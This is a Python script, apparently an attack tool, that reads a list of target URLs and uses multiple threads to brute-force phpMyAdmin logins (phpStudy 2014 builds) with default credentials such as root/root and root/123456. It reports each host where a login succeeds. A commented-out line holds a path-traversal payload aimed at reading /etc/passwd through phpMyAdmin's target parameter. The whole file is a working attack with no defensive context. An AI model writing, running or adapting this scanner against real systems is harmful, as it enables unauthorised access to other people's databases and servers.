import requests
import sys
import threading
import queue

list_name = sys.argv[1]
num = int(sys.argv[2])

quit = queue.Queue()
threading_num = num

url_list = open(list_name,'r',encoding='UTF-8')
lines = url_list.readlines()

url_list.close()
for line in lines:
	line = line.rstrip()
	if line[-1] == '/':
		line = line[0:-1]
	else:
		line = line
	#line = line + '/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
	line = line + '/phpmyadmin/index.php'
	quit.put(line)


def crawler():
	while not quit.empty():
		url = quit.get()
		username=['root']
		password=['root','123456','111111']
		for i in username:
			for j in password:
				data={
				"pma_username":i,
				"pma_password":j,
				"server":"1",
				}
				try:
					requests.packages.urllib3.disable_warnings()
					content = requests.post(url, data=data,verify=False, allow_redirects=True, timeout=5)
					#判断响应状态码是否为200
					if content.status_code == requests.codes.ok:
						# print (url,'',requests.codes.ok)
						if 'phpMyAdmin phpStudy 2014' in content.text:
							print (url + '    ok')
							print ("username:%s & password:%s" %(i,j))
				except requests.RequestException as e:
					pass

if __name__ == '__main__':
	for i in range(threading_num):
		t = threading.Thread(target=crawler)
		t.start()
